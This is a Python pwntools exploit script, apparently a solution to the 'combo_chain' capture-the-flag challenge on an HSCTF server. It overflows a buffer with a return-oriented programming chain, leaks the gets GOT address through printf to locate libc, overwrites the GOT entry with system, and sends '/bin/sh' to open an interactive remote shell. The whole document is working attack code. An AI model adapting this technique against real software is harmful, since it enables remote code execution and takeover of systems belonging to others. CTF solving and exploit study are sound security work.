from pwn import *

#p=process('./combo_chain')
p=remote('pwn.hsctf.com',2345)
e=ELF('./combo_chain')

printf=e.plt['printf']
gets_got = e.got['gets']
gets_plt = e.plt['gets']

poprdi = 0x0000000000401263
ret = 0x000000000040101a

pay = 'a'*0x10
pay += p64(ret)
pay += p64(poprdi)
pay += p64(gets_got)
pay += p64(printf)
pay += p64(poprdi)
pay += p64(0x404500)
pay += p64(gets_plt)
pay += p64(poprdi)
pay += p64(gets_got)
pay += p64(gets_plt)
pay += p64(poprdi)
pay += p64(0x404500)
pay += p64(gets_plt)

pause()
p.sendline(pay)
p.recvuntil('CARNAGE!: ')
lb = u64(p.recvn(6)+'\x00'*2)-0x6ed80
success(hex(lb))
system = lb+0x45390

p.sendline('/bin/sh\x00')
p.sendline(p64(system))

p.interactive()

